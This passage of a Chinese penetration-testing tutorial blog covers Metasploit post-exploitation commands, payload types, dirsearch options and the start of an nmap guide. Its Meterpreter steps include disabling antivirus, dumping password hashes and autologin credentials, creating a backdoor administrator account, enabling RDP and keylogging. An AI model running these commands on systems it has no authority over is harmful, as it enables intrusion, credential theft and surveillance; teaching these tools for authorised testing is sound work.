#清除日志</span><br></pre></td></tr></table></figure>
+
+<h4 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h4><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate           #自动进程迁移</span><br><span class="line">run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上</span><br><span class="line">run post/windows/manage/killav            #关闭杀毒软件</span><br><span class="line">run post/windows/manage/enable_rdp        #开启远程桌面服务</span><br><span class="line">run post/windows/manage/autoroute         #查看路由信息</span><br><span class="line">run post/windows/gather/enum_logged_on_users    #列举当前登录的用户</span><br><span class="line">run post/windows/gather/enum_applications       #列举应用程序</span><br><span class="line">run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码</span><br><span class="line">run post/windows/gather/smart_hashdump               #dump出所有用户的hash</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure>
+
+<h4 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h4><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run  killav</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取目标主机的详细信息"><a href="#获取目标主机的详细信息" class="headerlink" title="获取目标主机的详细信息"></a>获取目标主机的详细信息</h4><p>使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper </span><br></pre></td></tr></table></figure>
+
+<p>它将目标机器上的常见信息收集起来然后下载保存在本地</p>
+<h4 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h4><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd       # 切换目标目录；</span><br><span class="line">cat      # 读取文件内容；</span><br><span class="line">rm       # 删除文件；</span><br><span class="line">edit     # 使用vim编辑文件</span><br><span class="line">ls       # 获取当前目录下的文件；</span><br><span class="line">mkdir    # 新建目录；</span><br><span class="line">rmdir    # 删除目录；</span><br></pre></td></tr></table></figure>
+
+<h4 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h4><p><code>download file</code> 命令可以帮助我们从目标系统中下载文件</p>
+<p><code>upload file</code> 命令则能够向目标系统上传文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download Pictures</span><br><span class="line">upload /root/1.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 <code>getsystem</code> 命令，它可以使用多种技术在目标系统中实现提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid       # 命令可以获取当前用户的信息</span><br><span class="line"></span><br><span class="line">getsystem    # 当我们使用该命令进行提权后，用户身材为 NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p>
+</blockquote>
+<h4 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h4><p>传送门：<a target="_blank" rel="noopener" href="https://xie1997.blog.csdn.net/article/details/105815134">MSF中获取用户密码</a></p>
+<h4 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h4><p>先查看目标主机安装了哪些应用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure>
+
+<p>我们还可以使用 execute 命令在目标系统中执行应用程序。这个命令的使用方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">execute  参数  -f 可执行文件</span><br><span class="line"></span><br><span class="line"># 运行后它将执行所指定的命令。可选参数如下：</span><br><span class="line">-f : 指定可执行文件</span><br><span class="line">-H : 创建一个隐藏进程</span><br><span class="line">-a : 传递给命令的参数</span><br><span class="line">-i : 跟进程进行交互</span><br><span class="line">-m : 从内存中执行</span><br><span class="line">-t : 使用当前伪造的线程令牌运行进程</span><br><span class="line">-s : 在给定会话中执行进程</span><br></pre></td></tr></table></figure>
+
+<h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot    # 截图目标主机屏幕，可以看到，图片被保存到了　/root 目录下</span><br></pre></td></tr></table></figure>
+
+<h4 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h4><p>先查看目标主机有哪些用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们可以在目标系统中创建一个新的用户账号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run getgui -u hack -p 123    # 命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</span><br></pre></td></tr></table></figure>
+
+<p>这里成功创建了用户，但是添加到Administrators组中失败了 !</p>
+<p>如果添加到Administrators组中失败了的话，我们可以运行：<code>shell</code> ，进行cmd窗口手动将该用户添加到administrators组中。</p>
+<h4 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h4><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
+<p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用<code>-e</code>参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e</span><br><span class="line">或者</span><br><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p>在开启远程桌面会话之前，我们还需要使用 <code>idletime</code> 命令检查远程用户的空闲时长： <code>idletime</code></p>
+<p>然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。</p>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start    # 开启键盘记录功能</span><br><span class="line"></span><br><span class="line">keyscan_dump     # 显示捕捉到的键盘记录信息</span><br><span class="line"></span><br><span class="line">keyscan_stop     # 停止键盘记录功能</span><br></pre></td></tr></table></figure>
+
+<p>不过在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录</p>
+<h4 id="。。。"><a href="#。。。" class="headerlink" title="。。。"></a>。。。</h4><h3 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用(exploit)"></a>漏洞利用(exploit)</h3><p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。</p>
+<p>exploit漏洞利用模块路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits</span><br></pre></td></tr></table></figure>
+
+<p>这里面有针对不同平台的 exploit 。</p>
+<p>我们现在就进 windows 平台看看，这里会列出针对windows平台不同服务的漏洞利用</p>
+<p>我们进入<strong>smb</strong>服务，这是windows中经常爆出漏洞的服务，比如我们的永恒之蓝漏洞就在这里面。漏洞利用代码是以 rb 结尾的文件，因为metasploit是用Ruby语言编写的。</p>
+<h3 id="攻击载荷-payload"><a href="#攻击载荷-payload" class="headerlink" title="攻击载荷(payload)"></a>攻击载荷(payload)</h3><p>payload模块路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/payloads</span><br></pre></td></tr></table></figure>
+
+<p>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。</p>
+<p><strong>Shellcode</strong> ：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令 之后，才会提供一个命令行shell。</p>
+<p>Metasploit中的 Payload 模块主要有以下三种类型：Single、Stager、Stage</p>
+<p>在 Metasploit 中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Single Payload的格式为：<span class="tag">&lt;<span class="name">target</span>&gt;</span>/ <span class="tag">&lt;<span class="name">single</span>&gt;</span>  如：windows/powershell_bind_tcp</span><br><span class="line">Stager/Stage Payload的格式为：<span class="tag">&lt;<span class="name">target</span>&gt;</span>/ <span class="tag">&lt;<span class="name">stage</span>&gt;</span> / <span class="tag">&lt;<span class="name">stager</span>&gt;</span>  如：windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表：</p>
+<p>在这个列表中，像 windows&#x2F;powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload</p>
+<p>而 windows&#x2F;meterpreter&#x2F;reverse_tcp 则由一个<strong>Stage Payload</strong>（<strong>meterpreter</strong>）和 一个<strong>Stager Payload</strong>（<strong>reverse_tcp</strong>）组成</p>
+<p><strong>Stager中几种常见的payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp       <span class="comment">#正向连接</span></span><br><span class="line">windows/meterpreter/reverse_tcp    <span class="comment">#反向连接，常用</span></span><br><span class="line">windows/meterpreter/reverse_http   <span class="comment">#通过监听80端口反向连接</span></span><br><span class="line">windows/meterpreter/reverse_https  <span class="comment">#通过监听443端口反向连接</span></span><br><span class="line"></span><br><span class="line">正向连接使用场景：我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了</span><br><span class="line"></span><br><span class="line">反向连接使用场景：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</span><br><span class="line"></span><br><span class="line">反向连接80和443端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信</span><br></pre></td></tr></table></figure>
+
+<h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><p>Meterpreter属于<strong>stage payload</strong>，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。</p>
+<p>打开终端，检查环境是否安装。输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install metasploit-framework </span><br></pre></td></tr></table></figure>
+
+<p>生成payload时常见参数说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>msf控制台参数运用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- banner    # 这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。 </span><br><span class="line">- use       # 这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数 </span><br><span class="line">- Search    # 当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。</span><br><span class="line">            # 使用命令 `help search` 可以查看具体使用方法；</span><br><span class="line">            # 其他使用方法：</span><br><span class="line">                # ...... </span><br><span class="line">- show      # 这个命令用的很多。</span><br><span class="line">            # 如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。</span><br><span class="line">            # 如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1395854">【网络安全】Dirsearch 工具的安装、使用详细教程</a>、<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/537515948">dirsearch目录扫描工具下载与使用</a></p>
+</blockquote>
+<p>dirsearch是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p>
+<p>dirsearch下载地址： <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
+<p>运行环境：必须安装python3</p>
+<blockquote>
+<p>kali自带</p>
+</blockquote>
+<h3 id="强制（Mandatory）："><a href="#强制（Mandatory）：" class="headerlink" title="强制（Mandatory）："></a>强制（Mandatory）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL 目标 URL</span><br><span class="line"></span><br><span class="line">-l PATH --url-file=PATH 目标 URL 列表文件</span><br><span class="line"></span><br><span class="line">--stdin Target URL list from STDIN</span><br><span class="line"></span><br><span class="line">--cidr=CIDR Target CIDR</span><br><span class="line"></span><br><span class="line">--raw=FILE 从文件加载原始 HTTP 请求（使用 `--scheme` 标志设置方案）</span><br><span class="line"></span><br><span class="line">-e EXTENSIONS, --extensions=EXTENSIONS 以逗号分隔的扩展列表(例如：php,asp)</span><br><span class="line"></span><br><span class="line">-X EXTENSIONS, --exclude-extensions=EXTENSIONS (排除以逗号分隔的扩展列表（例如： asp,jsp))</span><br><span class="line"></span><br><span class="line">-f, --force-extensions 为每个词表条目添加扩展名。 默认dirsearch 仅将 %EXT% 关键字替换为扩展</span><br></pre></td></tr></table></figure>
+
+<h3 id="字典设置（Dictionary-Settings）："><a href="#字典设置（Dictionary-Settings）：" class="headerlink" title="字典设置（Dictionary Settings）："></a>字典设置（Dictionary Settings）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-w WORDLIST, --wordlists=WORDLIST 自定义词表（以逗号分隔）</span><br><span class="line"></span><br><span class="line">--prefixes=PREFIXES 为所有词表条目添加自定义前缀（分隔用逗号）</span><br><span class="line"></span><br><span class="line">--suffixes=SUFFIXES 为所有词表条目添加自定义后缀，忽略目录（以逗号分隔）</span><br><span class="line"></span><br><span class="line">--only-selected 删除路径与所选路径有不同的扩展名,通过`-e`（保留条目没有扩展名）</span><br><span class="line"></span><br><span class="line">--remove-extensions 删除所有路径中的扩展名（例如：admin.php -&gt;admin）</span><br><span class="line"></span><br><span class="line">-U, --uppercase 大写单词表</span><br><span class="line"></span><br><span class="line">-L, --lowercase 小写单词表</span><br><span class="line"></span><br><span class="line">-C, --capital 大写词表</span><br></pre></td></tr></table></figure>
+
+<h3 id="常规设置（General-Settings）："><a href="#常规设置（General-Settings）：" class="headerlink" title="常规设置（General Settings）："></a>常规设置（General Settings）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">-t THREADS, --threads=THREADS 线程数</span><br><span class="line"></span><br><span class="line">-r, --recursive 递归地暴力破解</span><br><span class="line"></span><br><span class="line">--deep-recursive 对每个目录深度执行递归扫描（例如：api/users -&gt; api/）</span><br><span class="line"></span><br><span class="line">--force-recursive 对每个找到的路径进行递归蛮力，而不是只有路径以斜线结尾</span><br><span class="line"></span><br><span class="line">-R DEPTH, --recursion-depth=DEPTH 最大递归深度</span><br><span class="line"></span><br><span class="line">--recursion-status=CODES 执行递归扫描的有效状态码，支持范围（以逗号分隔）</span><br><span class="line"></span><br><span class="line">--subdirs=SUBDIRS 扫描给定 URL[s] 的子目录（由逗号）</span><br><span class="line"></span><br><span class="line">--exclude-subdirs=SUBDIRS 递归时排除以下子目录扫描（以逗号分隔）</span><br><span class="line"></span><br><span class="line">-i CODES, --include-status=CODES 包含状态码，以逗号分隔，支持范围（例如：200,300-399）</span><br><span class="line"></span><br><span class="line">-x CODES, --exclude-status=CODES 排除状态码，以逗号分隔，支持范围（例如：301,500-599）</span><br><span class="line"></span><br><span class="line">--exclude-sizes=SIZES 按大小排除响应，以逗号分隔（例如：123B,4KB）</span><br><span class="line"></span><br><span class="line">--exclude-texts=TEXTS 按文本排除回复，以逗号分隔（例如：“未找到”、“错误”）</span><br><span class="line"></span><br><span class="line">--exclude-regexps=REGEXPS 按正则表达式排除响应，以逗号分隔（例如：&#x27;Not foun[a-z]&#123;1&#125;&#x27;, &#x27;^Error$&#x27;）</span><br><span class="line"></span><br><span class="line">--exclude-redirects=REGEXPS 通过重定向正则表达式或文本排除响应，以逗号分隔（例如：&#x27;https://okta.com/*&#x27;）</span><br><span class="line"></span><br><span class="line">--exclude-content=PATH 按此路径的响应内容排除响应</span><br><span class="line"></span><br><span class="line">--skip-on-status=CODES 每当点击这些状态代码之一时跳过目标， 逗号分隔，支持范围</span><br><span class="line"></span><br><span class="line">--minimal=LENGTH 最小响应长度</span><br><span class="line"></span><br><span class="line">--maximal=LENGTH 最大响应长度</span><br><span class="line"></span><br><span class="line">--max-time=SECONDS 扫描的最大运行时间</span><br><span class="line"></span><br><span class="line">-q, --quiet-mode 安静模式</span><br><span class="line"></span><br><span class="line">--full-url 输出中的完整 URL（在静音模式）</span><br><span class="line"></span><br><span class="line">--no-color 无彩色输出</span><br></pre></td></tr></table></figure>
+
+<h3 id="请求设置（Request-Settings）："><a href="#请求设置（Request-Settings）：" class="headerlink" title="请求设置（Request Settings）："></a>请求设置（Request Settings）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-m METHOD, --http-method=METHOD HTTP 方法（默认：GET）</span><br><span class="line"></span><br><span class="line">-d DATA, --data=DATA HTTP 请求数据</span><br><span class="line"></span><br><span class="line">-H HEADERS, --header=HEADERS HTTP 请求头，支持多个标志（例如：-H &#x27;Referer：Example Domain&#x27;)</span><br><span class="line"></span><br><span class="line">--header-list=FILE 文件包含 HTTP 请求标头</span><br><span class="line"></span><br><span class="line">-F, --follow-redirects 遵循 HTTP 重定向</span><br><span class="line"></span><br><span class="line">--random-agent 为每个请求选择一个随机的 User-Agent</span><br><span class="line"></span><br><span class="line">--auth-type=TYPE 认证类型(basic, digest, bearer, ntlm)</span><br><span class="line"></span><br><span class="line">--auth=CREDENTIAL 身份验证凭据(user:password or bearer token)</span><br><span class="line"></span><br><span class="line">--user-agent=USERAGENT 用户代理</span><br><span class="line"></span><br><span class="line">--cookie=COOKIE</span><br></pre></td></tr></table></figure>
+
+<h3 id="连接设置（Connection-Settings）："><a href="#连接设置（Connection-Settings）：" class="headerlink" title="连接设置（Connection Settings）："></a>连接设置（Connection Settings）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--timeout=TIMEOUT 连接超时</span><br><span class="line"></span><br><span class="line">-s DELAY, --delay=DELAY 请求之间的延迟</span><br><span class="line"></span><br><span class="line">--proxy=PROXY 代理 URL，支持 HTTP 和 SOCKS 代理(例如：localhost:8080, socks5://localhost:8088)</span><br><span class="line"></span><br><span class="line">--proxy-list=FILE 文件包含代理服务器</span><br><span class="line"></span><br><span class="line">--replay-proxy=PROXY 使用找到的路径重播的代理</span><br><span class="line"></span><br><span class="line">--scheme=SCHEME 默认方案（对于原始请求或者如果没有URL中的方案）</span><br><span class="line"></span><br><span class="line">--max-rate=RATE 每秒最大请求数</span><br><span class="line"></span><br><span class="line">--retries=RETRIES 失败请求的重试次数</span><br><span class="line"></span><br><span class="line">-b, --request-by-hostname 默认情况下，通过 IP 进行 dirsearch 请求以提高速度。 这将强制 dirsearch 按主机名请求hostname</span><br><span class="line"></span><br><span class="line">--ip=IP 服务器 IP 地址</span><br><span class="line"></span><br><span class="line">--exit-on-error 发生错误时退出</span><br></pre></td></tr></table></figure>
+
+<h3 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxx    //查看网站的目录</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -e php    //-e表示如果网站是php那么我们就扫描php</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -w    //-w加上指定目录</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r    //-r表示，扫出一个目录之后继续扫描目录下的目录</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx --random-agents    //表示使用随机useragent</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404    //查看网站的目录，排除状态代码403和404的</span><br><span class="line">dirsearch -u 192.168.2.88 -x 403,404 -t 50         //查看网站的目录，排除状态代码403和404的，使用线程数为50</span><br><span class="line">//目录扫描</span><br><span class="line"></span><br><span class="line">robots.txt</span><br><span class="line">upgrade.txt    更新日志</span><br><span class="line">drupal</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/php09/p/10530057.html">nmap使用教程</a> 、 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Kris__zhang/article/details/106841466">nmap超详细使用教程</a>、<a target="_blank" rel="noopener" href="http://sunwu.world/2022/01/04/nmap/">nmap基本使用</a></p>
+</blockquote>
+<p>nmap 是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。</p>
+<p>官网：<a target="_blank" rel="noopener" href="http://nmap.org/">http://nmap.org</a></p>
+<p>图形化：Zenmap</p>
+<p>Nmap有四种基本功能：「端口扫描」、「主机探测」、「服务识别」和「系统识别」。</p>
+<blockquote>
+<p>kali的命令行中可以直接使用 <code>nmap</code> 命令，打开一个「终端」，输入 <code>nmap</code> 后回车，可以看到 nmap 的版本，证明 nmap 可用。</p>
+<p>linux没权限的话，前面添加sudo</p>
+</blockquote>
+<p>用法：<code>nmap [扫描类型] [选项] &#123;目标规范&#125;</code></p>
+<h3 id="目标规格（TARGET-SPECIFICATION）："><a href="#目标规格（TARGET-SPECIFICATION）：" class="headerlink" title="目标规格（TARGET SPECIFICATION）："></a>目标规格（TARGET SPECIFICATION）：</h3><ul>
+<li>可传递主机名、IP 地址、网络等。</li>
+<li>例如：<code>scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</code></li>
+</ul>
